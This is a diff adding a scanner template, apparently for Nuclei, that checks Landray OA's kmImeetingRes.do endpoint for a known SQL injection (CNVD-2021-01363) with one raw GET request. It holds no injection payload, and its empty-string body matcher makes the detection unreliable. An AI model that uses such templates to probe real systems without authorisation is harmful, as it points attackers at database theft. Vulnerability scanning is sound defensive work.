@@ -1,0 +1,41 @@
+id: lanlingOA-kmlmeetingRes-sql-injection
+
+info:
+  name: 蓝凌OA kmImeetingRes.do 后台SQL注入漏洞 CNVD-2021-01363
+  author: cnaq
+  severity: high
+  description: 深圳市蓝凌软件股份有限公司数字OA(EKP)存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20kmImeetingRes.do%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-01363.html
+  tags: lanlingOA,sql,injection
+requests:
+  - raw:
+      - |
+        GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true HTTP/1.1
+        Host: {{Hostname}} 
+        Connection: close
+        Pragma: no-cache
+        Cache-Control: no-cache
+        sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
+        sec-ch-ua-mobile: ?0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: cross-site
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - HTTP/1.1 200 OK
+
+      - type: word
+        part: body
+        words:
+          - ''
